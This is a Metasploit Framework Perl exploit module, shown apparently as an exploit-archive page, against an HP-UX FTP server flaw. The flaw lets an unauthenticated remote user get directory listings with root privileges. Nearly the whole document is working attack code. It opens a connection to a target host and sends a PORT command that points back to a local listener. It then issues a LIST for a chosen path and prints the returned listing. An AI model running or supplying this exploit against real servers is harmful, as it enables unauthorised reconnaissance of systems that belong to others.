HP-UX FTP Server Preauthentication Directory Listing Exploit (meta)
===================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;HP-UX FTP Server Preauthentication Directory Listing&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.8 $&#039;,
	&#039;Authors&#039; => [ &#039;Optyx  <optyx [at] uberhax0r.net>&#039;],
	&#039;Arch&#039;  => [ ],
	&#039;OS&#039;    => [ &#039;hpux&#039; ],
	&#039;Priv&#039;  => 0,
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The FTP server port&#039;, 21],
		&#039;RPATH&#039; => [1, &#039;DATA&#039;, &#039;The path name to list&#039;, "/"],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
        This exploit abuses an unpublished vulnerability in the HP-UX FTP
        service. This flaw allows an unauthenticated remote user to obtain
        directory listings from this server with the privileges of the root
        user. This vulnerability was silently patched by HP sometime between 
		2001 and 2003.
}),
	&#039;Refs&#039;  =>
	  [
		# None
	  ],

	&#039;Keys&#039; => [&#039;ftp&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_path = $self->GetVar(&#039;RPATH&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	  
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	my $l = IO::Socket::INET->new
	  (
		Proto  => &#039;tcp&#039;,
		Listen => 5,
		Blocking => 0,
		ReuseAddr => 1,
	  );

	my $r;
	my $prt = ",".int($l->sockport / 256).",".int($l->sockport % 256);
	my $sel = IO::Select->new($l);
	my $cmd = "PORT ".join(",", split(/\./,Pex::InternetIP($target_host))).$prt."\r\n";

	$r .= $s->Recv(-1, 5);

	$s->Send($cmd);
	$r .= $s->Recv(-1, 5);

	$s->Send("LIST $target_path\r\n");
	$r .= $s->Recv(-1, 5);
	$s->Close;

	foreach (split(/\n/, $r)) {
		chomp;
		$self->PrintLine("[*] $_");
	}

	my @rdy = $sel->can_read(3);
	if (scalar(@rdy)) {
		my $x = $l->accept();
		$self->PrintLine("[*] Accepted connection from ".$x->sockhost.":".$x->sockport);

		while (<$x>) {
			chomp;
			$self->PrintLine($_);
		}
		$x->shutdown(2);
		$x->close;
	}
	$l->shutdown(2);
	$l->close;
	return;
}


